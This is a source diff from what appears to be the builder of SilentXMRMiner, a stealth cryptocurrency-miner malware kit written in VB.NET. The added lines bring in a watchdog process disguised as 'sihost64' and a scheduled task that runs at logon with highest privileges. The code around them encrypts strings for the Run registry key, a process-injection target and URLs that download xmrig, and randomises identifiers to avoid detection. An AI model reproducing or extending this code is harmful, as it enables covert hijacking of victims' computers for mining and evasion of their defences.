@@ -150,7 +150,7 @@ Public Class Codedom
             Dim Resources_Loader = F.Randomi(rand.Next(5, 40))
 
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Resources_Loader + ".Resources")
-                R.AddResource(Resources_Program, Encoding.ASCII.GetBytes(Convert.ToBase64String(ProgramBytes.Reverse().ToArray())))
+                R.AddResource(Resources_Program, ProgramBytes.Reverse().ToArray())
                 R.Generate()
             End Using
 
@@ -292,13 +292,14 @@ Public Class Codedom
         stringb.Replace("#KEY", F.AESKEY)
         stringb.Replace("#SALT", F.SALT)
         stringb.Replace("#IV", F.IV)
-        stringb.Replace("#LIBSPATH", F.EncryptString("Microsoft\Libs\"))
         stringb.Replace("#DLLSTR", F.EncryptString("Mandark.Mandark"))
         stringb.Replace("#DLLOAD", F.EncryptString("Load"))
         stringb.Replace("#REGKEY", F.EncryptString("Software\Microsoft\Windows\CurrentVersion\Run\"))
         stringb.Replace("#LIBSURL", F.EncryptString("https://github.com/UnamSanctam/SilentXMRMiner/raw/master/SilentXMRMiner/Resources/libs.zip"))
         stringb.Replace("#MINERURL", F.EncryptString("https://github.com/UnamSanctam/SilentXMRMiner/raw/master/SilentXMRMiner/Resources/xmrig.zip"))
         stringb.Replace("#LIBSPATH", F.EncryptString("Microsoft\Libs\"))
+        stringb.Replace("#WATCHDOG", F.EncryptString("sihost64"))
+        stringb.Replace("#TASKSCH", F.EncryptString("/c schtasks /create /f /sc onlogon /rl highest /tn "))
         stringb.Replace("#InjectionTarget", F.EncryptString(F.InjectionTarget(0)))
         stringb.Replace("#InjectionDir", F.InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", """ + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + """))
 
@@ -318,5 +319,8 @@ Public Class Codedom
         stringb.Replace("rarg1", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("rarg2", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("rarg3", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rbD", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rplp", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("rxM", F.Randomi(F.rand.Next(5, 40)))
     End Sub
 End Class
